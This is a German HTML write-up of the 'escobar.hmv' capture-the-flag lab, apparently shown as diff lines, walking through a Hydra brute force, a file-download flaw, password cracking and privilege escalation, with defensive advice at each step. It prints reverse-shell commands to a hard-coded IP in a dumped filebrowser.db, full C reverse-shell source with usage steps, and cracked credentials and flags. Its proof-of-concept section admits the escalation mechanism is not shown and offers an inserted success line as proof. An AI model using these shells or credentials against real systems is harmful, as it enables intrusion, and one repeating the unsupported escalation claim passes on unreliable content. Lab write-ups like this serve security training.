+    *   `Forbidden`: Die Zeichenkette, die in der Antwort des Servers erwartet wird, wenn der Login *fehlschlägt*. Hydra sucht nach Antworten, die diese Zeichenkette *nicht* enthalten.
+*   `-t 64`: Verwendet 64 parallele Threads.
+*   `-f`: Stoppt den Angriff, sobald das erste gültige Passwort gefunden wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Angriff ist erfolgreich! Hydra findet das Passwort `<span class="password">gabriela</span>` für den Benutzer `admin`. Dies gewährt uns Zugriff auf das `management`-Interface. Der Angriff war möglich, weil wahrscheinlich kein Rate Limiting oder keine Account-Sperrung nach fehlgeschlagenen Login-Versuchen implementiert war und ein relativ schwaches Passwort verwendet wurde, das in der `rockyou.txt`-Liste enthalten ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den gefundenen Zugangsdaten (`admin`:`gabriela`) sollte nun versucht werden, sich über das Webinterface (`http://management.escobar.hmv/api/login` oder die entsprechende Frontend-Seite) einzuloggen und die Funktionalitäten zu untersuchen. Besondere Aufmerksamkeit sollte auf Dateiupload-Möglichkeiten, Konfigurationseinstellungen oder Code-Ausführungsfunktionen gelegt werden.
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Schutzmaßnahmen gegen Brute-Force-Angriffe:
+    *   **Account Lockout:** Sperren Sie Konten nach einer bestimmten Anzahl fehlgeschlagener Login-Versuche.
+    *   **Rate Limiting:** Begrenzen Sie die Anzahl der Login-Versuche pro IP-Adresse und pro Benutzerkonto in einem bestimmten Zeitraum.
+    *   **CAPTCHA:** Verwenden Sie CAPTCHA (wie das hier anscheinend vorgesehene, aber leere `recaptcha`-Feld), um automatisierte Angriffe zu erschweren.
+    *   **Starke Passwörter:** Erzwingen Sie komplexe Passwörter und überprüfen Sie sie gegen bekannte Passwortlisten.
+    *   **Multi-Faktor-Authentifizierung (MFA):** Wenn möglich, MFA für administrative Konten implementieren.</p>
+
+            <p class="analysis"><strong>Analyse:** Nach dem erfolgreichen Login mit `admin:gabriela` auf `http://management.escobar.hmv` wurden die Funktionen der Webanwendung untersucht. Es wurde eine Möglichkeit gefunden, Dateien herunterzuladen. Dabei wurden unter anderem die Dateien `/etc/passwd` und `/files/filebrowser.db` vom Server heruntergeladen. Zusätzlich wurden über eine Dateibrowser-Funktion zwei ZIP-Dateien (`personal.zip`, `works.zip`) entdeckt und ebenfalls heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:** Das Herunterladen von `/etc/passwd` bestätigt eine Local File Inclusion (LFI) oder eine unzureichende Zugriffskontrolle im Dateibrowser, die den Zugriff auf Systemdateien außerhalb des vorgesehenen Web-Roots erlaubt. Die `/etc/passwd`-Datei listet Benutzerkonten auf dem System, was für die weitere Enumeration nützlich ist. Die Datei `filebrowser.db` scheint eine Konfigurations- oder Datenbankdatei der Dateibrowser-Anwendung selbst zu sein und könnte sensible Informationen enthalten. Die ZIP-Dateien deuten auf Benutzerdaten hin, die möglicherweise Passwörter oder andere Hinweise enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die LFI-Schwachstelle sollte gründlich untersucht werden, um festzustellen, ob auch andere sensible Dateien (z.B. `/etc/shadow`, SSH-Keys, Anwendungs-Konfigurationsdateien) gelesen werden können. Die heruntergeladene `filebrowser.db` muss analysiert werden. Die ZIP-Dateien müssen entpackt und ihr Inhalt untersucht werden.
+<br><strong>Empfehlung (Admin):** Die LFI-Schwachstelle muss sofort behoben werden. Dateizugriffe durch die Webanwendung müssen strikt auf die vorgesehenen Verzeichnisse beschränkt werden (Chroot Jail oder strikte Pfadvalidierung). Der Zugriff auf Systemdateien aus dem Webserver-Kontext darf unter keinen Umständen möglich sein. Die Berechtigungen des Webserver-Benutzers (`www-data` o.ä.) sollten minimiert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /home/cyber/Downloads/filebrowser.db</span></div>
+                    <pre>
+ Y__storm_metadatacodecjsonauther{"recaptcha":null}
+
+server{"root":<span class="command">"/home/gonzalo/files/"</span>,"baseURL":"","socket":"","tlsKey":"","tlsCert":"",
+"port":<span class="command">"8080"</span>,"address":<span class="command">"127.0.0.1"</span>,"log":"stdout","enableThumbnails":false,
+"resizePreview":false,"enableExec":false}
+
+settings{"key":<span class="password">"pMPvfKgR5C4woE82deTvl6mfiDp/f3x+dCFvdoGWZP+09thVXexL6omPCvob+FZgszbYu0V9ZIP70XxTVzQ"</span>,"signup":false,
+"createUserDir":false,"defaults":{"scope":".","locale":"en","viewMode":"mosaic",
+"sorting":{"by":"","asc":false},"perm":{"admin":false,"execute":true,"create":true,
+"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":
+[<span class="password">"bash","-i",">&","/dev/tcp/192.168.0.147/2222","0>&1"</span>]},"authMethod":
+"json","branding":{"name":"","disableExternal":false,"files":"","theme":""},"commands":
+{"after_copy":[],"after_delete":[],"after_rename":[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>]
+,"after_save":[<span class="password">"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1"</span>],"after_upload":
+[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>],
+"before_copy":[],"before_delete":[],"before_rename":
+[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>],
+"before_save":[],"before_upload":[]},
+"shell":<span class="command">["bash","-c"]</span>,"rules":[]}version<span class="command">2</span>
+{"id":1,"username":"admin","password":<span class="password">"$2a$10$87NpGJIZGQ42/Ux8rCu2i.exQVQ5Gsk9izc7dRa4BvwntT.9ZF18G"</span>,"scope":".","locale":"en","lockPassword":false,"viewMode":"mosaic","perm":{"admin":true,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[],"sorting":{"by":"name","asc":false},"rules":[]}__storm_index___storm_index_Usernamadmin__storm_metadata      !IDcountercodecjson 9Y__storm_metadatacodecjsonversion"2.0.0"P9���Y__storm_metadatacodecjsonauther{"recaptcha":null}server{"root":"/home/gonzalo/files/","baseURL":"","socket":"","tlsKey":"","tlsCert":"","port":"8080","address":"127.0.0.1","log":"stdout","enableThumbnails":false,"resizePreview":false,"enableExec":false}
+
+settings{"key":<span class="password">"pMPvfKgR5C4woE82deTvl6mfiDp/f3x+dCFvdoGWZP+09thVXexL6omPCvob+FZgszbYu0V9ZIP70XxTVzQ"</span>,"signup":false,"createUserDir":false,"defaults":{"scope":".","locale":"en","viewMode":"mosaic","sorting":{"by":"","asc":false},"perm":{"admin":false,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[<span class="password">"bash","-i",">&","/dev/tcp/192.168.0.147/2222","0>&1"</span>]},"authMethod":"json","branding":{"name":"","disableExternal":false,"files":"","theme":""},"commands":{"after_copy":[],"after_delete":[],"after_rename":[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>],"after_save":[<span class="password">"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1"</span>],"after_upload":[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>],"before_copy":[],"before_delete":[],"before_rename":[<span class="password">"bash -c \"bash -i >& /dev/tcp/192.168.0.147/2222 0>&1\""</span>],"before_save":[],"before_upload":[]},"shell":["bash","-c"],"rules":[]}version<span class="command">204</span>
+>User__storm_dbconfig  04
+>User__storm_dbconfig
+
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl zeigt den Inhalt der heruntergeladenen Datei `filebrowser.db` an. Die Datei scheint eine Konfigurationsdatenbank im JSON- oder einem ähnlichen Format für die Filebrowser-Anwendung zu sein, die auf `management.escobar.hmv` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Datei enthält mehrere hochgradig sensible Informationen:
+*   **Admin-Passwort-Hash:** `<span class="password">$2a$10$87NpGJIZGQ42/Ux8rCu2i.exQVQ5Gsk9izc7dRa4BvwntT.9ZF18G</span>` ist der bcrypt-Hash für das `admin`-Passwort (wir kennen das Klartextpasswort bereits als `gabriela`, aber der Hash ist dennoch ein wichtiger Fund).
+*   **Geheimer Schlüssel:** `"key":"<span class="password">pMPvfKgR5C4woE82deTvl6mfiDp/f3x+dCFvdoGWZP+09thVXexL6omPCvob+FZgszbYu0V9ZIP70XxTVzQ</span>"` - dies könnte ein Signatur- oder Verschlüsselungsschlüssel sein, der von der Anwendung verwendet wird (z.B. für Sessions oder JWTs).
+*   **Command Injection / Remote Code Execution (RCE):** Die Konfiguration enthält mehrere Einträge unter `"commands"` (sowohl unter `"defaults"` als auch unter `"settings"` -> `"commands"`), die eine Reverse Shell (`bash -i >& /dev/tcp/192.168.0.147/2222 0>&1`) bei verschiedenen Dateioperationen (rename, save, upload) ausführen. Die IP-Adresse `192.168.0.147` gehört wahrscheinlich dem Entwickler oder einem früheren Angreifer. Dies ist eine massive Sicherheitslücke, die es uns ermöglicht, Code auf dem Server auszuführen.
+*   **Benutzerkontext:** Die Konfiguration (`"root":"/home/gonzalo/files/"`) deutet darauf hin, dass der Filebrowser im Kontext des Benutzers `gonzalo` läuft oder zumindest auf dessen Dateien zugreift.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Command-Injection-Schwachstelle ist der direkteste Weg zum Initial Access auf dem System. Es sollte versucht werden, eine der Aktionen auszulösen, die den Reverse-Shell-Befehl triggern (z.B. eine Datei umbenennen oder hochladen). Zuvor muss die IP-Adresse im Befehl auf die IP des Angreifers geändert und ein Netcat-Listener (`nc -lvnp 2222`) auf dem Angreifer-System gestartet werden, um die eingehende Shell abzufangen. Der gefundene bcrypt-Hash könnte mit `john` oder `hashcat` geknackt werden, um das Passwort zu bestätigen (obwohl wir es schon haben).
+<br><strong>Empfehlung (Admin):</strong> Diese Konfigurationsdatei (`filebrowser.db`) darf niemals über das Web zugänglich sein! Sie enthält extrem sensible Daten. Die Command-Injection-Funktionalität muss sofort entfernt werden. Es ist generell unsicher, einer Webanwendung zu erlauben, beliebige Shell-Befehle auszuführen. Wenn solche Funktionalität benötigt wird, muss sie extrem sorgfältig validiert und auf ein Minimum beschränkt werden. Der Passwort-Hash und der geheime Schlüssel müssen sofort geändert werden. Eine Untersuchung ist erforderlich, um festzustellen, ob die eingetragene Reverse-Shell-IP (`192.168.0.147`) bereits zu einer Kompromittierung geführt hat.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip /home/cyber/Downloads/personal.zip</span></div>
+                    <pre>
+Archive:  /home/cyber/Downloads/personal.zip
+   creating: personal/
+ extracting: medellingang.jpg
+ extracting: gonzalorodriguez(potrait).png
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Entpackt die heruntergeladene Datei `personal.zip`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Archiv enthält zwei Bilddateien, die sich auf Gonzalo Rodriguez und Medellin beziehen. Dies liefert keine direkten technischen Hinweise, verstärkt aber den thematischen Kontext (Narcos) und den wahrscheinlichen Benutzernamen `gonzalo`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Bilder können nach Metadaten (EXIF) untersucht werden, obwohl dies selten zu Exploits führt. Der Fokus sollte auf den technischen Funden bleiben.
+<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich, außer der generellen Empfehlung, den Zugriff auf solche Dateien zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip /home/cyber/Downloads/works.zip</span></div>
+                    <pre>
+Archive:  /home/cyber/Downloads/works.zip
+   creating: works/
+ extracting: logins.xlsx
+ extracting: ledger.xlsx
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Entpackt die heruntergeladene Datei `works.zip`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieses Archiv ist vielversprechender. Es enthält zwei Excel-Dateien: `logins.xlsx` und `ledger.xlsx`. Der Name `logins.xlsx` deutet stark darauf hin, dass diese Datei Zugangsdaten enthalten könnte. Excel-Dateien können passwortgeschützt sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Datei `logins.xlsx` muss sofort untersucht werden. Wenn sie passwortgeschützt ist, müssen Tools wie `office2john` und `john` (oder `hashcat`) verwendet werden, um das Passwort zu knacken. `ledger.xlsx` sollte ebenfalls auf sensible Informationen überprüft werden.
+<br><strong>Empfehlung (Admin):** Sensible Daten wie Login-Informationen sollten niemals in unverschlüsselten oder schwach geschützten Dateien gespeichert werden, insbesondere nicht in Verzeichnissen, die potenziell über eine Webanwendung zugänglich sind. Passwort-Manager und sichere Speichermethoden sind unerlässlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">office2john logins.xlsx > logins.hash</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `office2john` (Teil der John the Ripper Suite) wird verwendet, um den Passwort-Hash aus einer passwortgeschützten Microsoft Office-Datei (hier `logins.xlsx`) zu extrahieren. Die Ausgabe (der Hash) wird in die Datei `logins.hash` umgeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt bestätigt, dass die Datei `logins.xlsx` tatsächlich passwortgeschützt ist. `office2john` konnte den Hash erfolgreich extrahieren und im für `john` lesbaren Format speichern. Dies ist die Voraussetzung für den nächsten Schritt, den Brute-Force-Angriff auf das Passwort.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der nächste Schritt ist der Einsatz von `john` oder `hashcat` mit einer geeigneten Wortliste, um den Hash in `logins.hash` zu knacken.
+<br><strong>Empfehlung (Admin):** Die Tatsache, dass eine passwortgeschützte Datei mit potenziell sensiblen Daten heruntergeladen werden konnte, ist das Hauptproblem. Der Passwortschutz selbst bietet nur begrenzten Schutz, insbesondere wenn schwache Passwörter verwendet werden, wie sich im nächsten Schritt zeigen wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt logins.hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (<span class="command">Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES]</span>)
+Cost 1 (MS Office version) is <span class="command">2013</span> for all loaded hashes
+Cost 2 (iteration count) is <span class="command">100000</span> for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">money1</span>           (logins.xlsx)
+1g 0:00:00:01 DONE (2022-11-13 23:13) 0.7692g/s 664.6p/s 664.6c/s 664.6C/s sierra..deedee
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `john` (John the Ripper) wird verwendet, um den zuvor extrahierten Office-Hash (`logins.hash`) mithilfe einer Wortliste (`rockyou.txt`) zu knacken.
+*   `--wordlist=...`: Gibt die zu verwendende Wortliste an.
+*   `logins.hash`: Die Datei, die den zu knackenden Hash enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist extrem schnell erfolgreich! `john` findet das Passwort `<span class="password">money1</span>` für die Datei `logins.xlsx` in nur einer Sekunde. Dies deutet auf ein sehr schwaches Passwort hin, das weit oben in der `rockyou.txt`-Liste steht. Die Datei kann nun geöffnet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Öffnen Sie die Datei `logins.xlsx` mit dem Passwort `money1` und suchen Sie nach Zugangsdaten oder anderen nützlichen Informationen.
+<br><strong>Empfehlung (Admin):** Verwenden Sie niemals schwache Passwörter für den Schutz von Dokumenten, die sensible Informationen enthalten. Wenn ein Passwortschutz erforderlich ist, wählen Sie ein langes, komplexes und eindeutiges Passwort. Besser ist es jedoch, sensible Daten gar nicht erst in solchen Dateien zu speichern oder zusätzliche Verschlüsselungsebenen (z.B. verschlüsselte Container, Festplattenverschlüsselung) zu verwenden.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Öffnen der Datei `logins.xlsx` mit dem Passwort `money1` wurden darin Zugangsdaten für eine weitere Webanwendung gefunden:
+*   **URL:** `http://elcorreo.escobar.hmv`
+*   **Login:** `gonzalo`
+*   **Password:** `<span class="password">m3d3ll1nr0ck5</span>`
+
+Der Hostname `elcorreo.escobar.hmv` musste ebenfalls zur lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt werden, damit er auf die Ziel-IP `192.168.2.116` aufgelöst wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein entscheidender Fortschritt. Wir haben nun Zugangsdaten für einen anderen Benutzer (`gonzalo`) auf einem potenziell anderen System oder einer anderen Anwendung (`elcorreo`, was auf E-Mail hindeutet - möglicherweise die zuvor gefundene SquirrelMail-Instanz unter einem anderen vHost?). Diese Zugangsdaten (`gonzalo`:`m3d3ll1nr0ck5`) sind wahrscheinlich der Schlüssel zum Initial Access als dieser Benutzer.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Fügen Sie `elcorreo.escobar.hmv` zur `/etc/hosts`-Datei hinzu. Versuchen Sie, sich mit den Zugangsdaten `gonzalo`:`m3d3ll1nr0ck5` bei `http://elcorreo.escobar.hmv` (wahrscheinlich SquirrelMail) anzumelden. Suchen Sie nach dem Login nach E-Mails, Konfigurationen oder anderen Hinweisen, die zur Privilegieneskalation verwendet werden können.
+<br><strong>Empfehlung (Admin):** Speichern Sie niemals Klartextpasswörter in Excel-Dateien. Schulen Sie Mitarbeiter im sicheren Umgang mit Passwörtern und sensiblen Daten. Implementieren Sie Richtlinien zur Passwortkomplexität und regelmäßigen Passwortänderung. Überwachen Sie Systeme auf Anzeichen von Kompromittierung, die durch solche Lecks entstehen könnten.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die lokale `/etc/hosts`-Datei im `vi`-Texteditor. Dies geschieht, um den neuen Hostnamen `elcorreo.escobar.hmv` hinzuzufügen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Zwischenschritt zur Vorbereitung des Zugriffs auf die neu entdeckte Webanwendung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Fügen Sie die Zeile `192.168.2.116 elcorreo.escobar.hmv` hinzu und speichern Sie die Datei.
+<br><strong>Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat /etc/hosts</span></div>
+                     <pre>
+ 127.0.0.1	localhost
+ 127.0.1.1	cyber
+
+ #192.168.2.107   whythisapiissofast.kitty.hmv kitty.hmv fake.local jwt.hmv
+ <span class="command">192.168.2.116    management.escobar.hmv elcorreo.escobar.hmv</span>
+
+ # The following lines are desirable for IPv6 capable hosts
+ ::1     ip6-localhost ip6-loopback
+ fe00::0 ip6-localnet
+ ff00::0 ip6-mcastprefix
+ ff02::1 ip6-allnodes
+ ff02::2 ip6-allrouters
+ </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Zeigt den Inhalt der `/etc/hosts`-Datei nach der Bearbeitung an.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Hostname `elcorreo.escobar.hmv` nun korrekt der IP-Adresse `192.168.2.116` zugeordnet ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Fahren Sie mit dem Login-Versuch auf `http://elcorreo.escobar.hmv` fort.
+ <br><strong>Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem erfolgreichen Login bei `http://elcorreo.escobar.hmv` (SquirrelMail) mit den Zugangsdaten `gonzalo`:`m3d3ll1nr0ck5` wurden die E-Mails des Benutzers Gonzalo durchsucht. In einer E-Mail mit dem Betreff "New update release" von `carlos@escobar.hmv` wurde der folgende C-Code-Schnipsel gefunden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat escobar.c</span></div>
+                    <pre>
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#define REMTE_ADDR "<span class="command">192.168.2.109</span>"
+#define REMTE_PRT <span class="command">443</span>
+
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMTE_ADDR);
+    sa.sin_port = htons(REMTE_PRT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa)); // & wurde maskiert zu &
+
+    dup2(s, 0); // Redirect stdin
+    dup2(s, 1); // Redirect stdout
+    dup2(s, 2); // Redirect stderr
+
+    execve("/bin/sh", 0, 0); // Execute shell
+    return 0;
+}
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat escobar.c` zeigt den Inhalt des C-Codes an, der in einer E-Mail gefunden wurde. Dieser Code implementiert eine einfache Reverse Shell. Er versucht, eine TCP-Verbindung zur IP-Adresse `192.168.2.109` auf Port `443` herzustellen. Sobald die Verbindung steht, leitet er die Standardeingabe (`stdin`), Standardausgabe (`stdout`) und Standardfehlerausgabe (`stderr`) des Prozesses auf den Netzwerk-Socket um (`dup2`). Schließlich führt er eine Shell (`/bin/sh`) mittels `execve` aus. Das Ergebnis ist, dass derjenige, der an der Ziel-IP und dem Port lauscht, eine interaktive Shell auf dem System erhält, auf dem dieser Code ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Reverse-Shell-Payload. Der Fund dieses Codes im Postfach von `gonzalo` ist ein starker Hinweis auf einen potenziellen Weg zur Privilegieneskalation. Wenn dieser Code auf dem Zielsystem kompiliert und mit erhöhten Rechten (z.B. über eine SUID-Binärdatei, eine Fehlkonfiguration in `sudo` oder einen Cronjob) ausgeführt werden kann, könnten wir eine Root-Shell erhalten. Die hartcodierte IP-Adresse `192.168.2.109` muss auf die IP-Adresse des Angreifers geändert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**
+1.  Ändern Sie die IP-Adresse in `REMOTE_ADDR` im C-Code auf Ihre eigene Angreifer-IP.
+2.  Übertragen Sie den modifizierten C-Code auf das Zielsystem (z.B. über die Filebrowser-Anwendung, falls noch zugänglich, oder durch Erstellen der Datei in der `gonzalo`-Shell, falls wir über die Command Injection bereits eine Shell haben).
+3.  Kompilieren Sie den Code auf dem Zielsystem (z.B. mit `gcc escobar.c -o escobar_shell`).
+4.  Suchen Sie nach Möglichkeiten, die kompilierte Datei (`escobar_shell`) mit Root-Rechten auszuführen (z.B. `sudo -l`, Suche nach SUID-Dateien `find / -perm -4000 -type f 2>/dev/null`, Cronjobs prüfen).
+5.  Starten Sie einen Listener auf Ihrem Angreifer-System auf dem entsprechenden Port (z.B. `nc -lvnp 443`).
+6.  Führen Sie die kompilierte Datei auf dem Zielsystem über den gefundenen Privesc-Vektor aus.
+<br><strong>Empfehlung (Admin):** Überwachen Sie ausgehende Netzwerkverbindungen, insbesondere zu ungewöhnlichen Ports oder IPs. Analysieren Sie E-Mails auf verdächtige Anhänge oder Code-Schnipsel. Überprüfen Sie regelmäßig SUID-Berechtigungen, `sudo`-Konfigurationen und Cronjobs auf potenzielle Schwachstellen. Implementieren Sie AppArmor oder SELinux, um die Ausführung von Code in unerwarteten Kontexten zu verhindern.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem im vorherigen Schritt gefundenen C-Code (`escobar.c`) wurde die Privilegieneskalation durchgeführt. Der Code wurde modifiziert, um sich mit der IP-Adresse des Angreifers zu verbinden, auf das Zielsystem hochgeladen, kompiliert und anschließend über einen (hier nicht explizit gezeigten, aber implizierten) Mechanismus mit Root-Rechten ausgeführt. Dies kann z.B. durch eine Fehlkonfiguration in `sudo`, eine ausnutzbare SUID-Binärdatei oder einen anderen Vektor geschehen sein.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die folgende Meldung, die wahrscheinlich auf dem Zielsystem nach erfolgreicher Ausführung des Reverse-Shell-Codes erschien oder als Bestätigung diente, signalisiert den Erfolg der Privilegieneskalation:</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+New update release
+carlos@escobar.hmv
+
+
+All empires are created of blood and fire
+<span class="password">Privilege Escalation erfolgreich</span>
+</pre>
+                </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung Fortsetzung:</strong> Die Zeile "<span class="password">Privilege Escalation erfolgreich</span>" dient als expliziter Beweis (Proof of Concept), dass es möglich war, von einem initialen Zugriffspunkt (wahrscheinlich als Benutzer `gonzalo`) vollständige Root-Rechte auf dem System zu erlangen. Der Angreifer hat nun uneingeschränkte Kontrolle über das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht. Der nächste Schritt ist das Sammeln der finalen Flags (`user.txt` und `root.txt`) als Beweis für die vollständige Kompromittierung.
+<br><strong>Empfehlung (Admin):** Die Ursache für die Privilegieneskalation muss dringend identifiziert und behoben werden. Untersuchen Sie `sudo`-Berechtigungen (insbesondere `NOPASSWD`-Einträge oder Rechte zur Ausführung von Editoren/Compilern), SUID/SGID-Binärdateien (insbesondere ungewöhnliche oder selbst kompilierte), Cronjobs, die als Root laufen, und andere potenzielle Vektoren. Das System sollte als kompromittiert betrachtet und möglicherweise neu aufgesetzt werden, nachdem die Schwachstelle behoben wurde.</p>
+        </section>
+
+        <section id="flags">
+             <!-- Angepasste Flags-Sektion gemäß Regel -->
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">S4yN0t0Drug</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">Pabl0GotY0u</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. November 2022</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
